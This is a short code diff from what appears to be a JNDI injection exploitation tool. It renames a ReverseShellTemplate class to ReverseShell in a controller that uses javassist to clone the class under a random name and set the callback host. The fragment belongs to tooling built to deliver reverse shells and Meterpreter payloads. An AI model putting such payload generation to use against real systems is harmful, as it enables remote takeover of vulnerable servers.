@@ -5,7 +5,7 @@ import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.server.WebServer;
 import map.jndi.template.Meterpreter;
-import map.jndi.template.ReverseShellTemplate;
+import map.jndi.template.ReverseShell;
 import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
 import javassist.*;
@@ -94,7 +94,7 @@ public class BasicController implements Controller {
 
         String className = MiscUtil.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
-        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
+        CtClass clazz = pool.get(ReverseShell.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
 
         ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
